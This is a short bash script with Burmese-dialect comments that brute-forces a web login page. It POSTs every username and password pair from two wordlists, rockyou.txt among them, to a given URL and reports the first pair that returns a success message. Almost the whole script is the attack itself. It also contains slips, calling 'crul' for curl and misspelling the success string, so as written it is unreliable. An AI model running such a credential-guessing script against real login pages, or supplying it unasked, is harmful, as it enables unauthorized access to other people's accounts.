#!/bin/bash

#လိုအပ်တေ argu တိ ပါ မပါကို အရင်စစ်....မပြည့်စုံကေ usage ထုတ်ပြဖို့အတွက်..
if [ "$#" -ne 3 ]; then
    echo "Usage : bash $0 <url> <usernames_file> <passwords_file>"
    echo "<url> : http://example.com/login.php or https://example.com/login.php "
    echo "<username_file> : /usr/share/wordlists/user.txt"
    echo "<passwords_file> : /usr/share/wordlists/rockyou.txt "
    exit 1
fi

#user file ထဲက user တစ်ယောက်ချင်းကို အသုံးပြုဖို့အတွက်...
while IFS= read -r USERNAME || [[ -n "$USERNAME" ]]; do
    #password file မှာလည်းအတူတူပါယာ..
    while IFS= read -r PASSWORD || [[ -n "$PASSWORD" ]]; do
        #crul ကိုသုံးပြီး ကေ authenticate လုပ်ကြည့်
        #အောင်မြင်မှု ဟိမဟိ ကို response ပေါ်မူတည်ပြီး စစ်
        #ရလာဒ်ကို resp ထဲမှာ vari နဲ့သိမ်း
        response=$(crul -s -d "username=$USERNAME&password=$PASSWORD" -X POST "$1")
        if [[ $response == *"Congratutations! Login Successful!"* ]]; then
            echo "Success : Credentials found - Username, $USERNAME, password: $PASSWORD"
            exit 0
        else
            echo "Login Failed...try Again..."
        fi
    done < "$3"
done < "$2"

#လုံးဝမပါလာကေ ထုတ်ပြဖို့အတွက် 
echo "No valid credentials found. use another credential files."
exit 1